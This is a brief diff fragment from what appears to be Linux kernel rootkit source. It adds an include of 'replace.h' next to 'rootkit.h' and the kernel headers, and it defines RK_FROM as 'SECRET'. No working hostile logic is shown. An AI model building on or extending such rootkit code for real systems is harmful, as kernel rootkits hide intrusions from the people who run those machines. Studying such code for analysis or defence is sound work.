@@ -10,6 +10,7 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 
+#include "replace.h"
 #include "rootkit.h"
 
 #define RK_FROM "SECRET"
